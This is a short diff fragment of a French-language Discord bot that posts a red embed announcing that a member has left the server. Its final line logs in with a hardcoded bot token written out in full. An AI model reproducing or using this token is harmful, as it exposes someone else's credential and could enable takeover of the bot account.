+    .setDescription(`${member.displayName} vient de quitter le serveur`)
+    .setColor("#FE0135")
+    .setThumbnail(avatar)
+    journal.send(embed);
+    
+    })
+client.login("NTg4MzY2NTM2MTM0MzYxMTA5.XQEG6Q.eEQd8V7e1vEws0Vm9CojXLLMY4k");
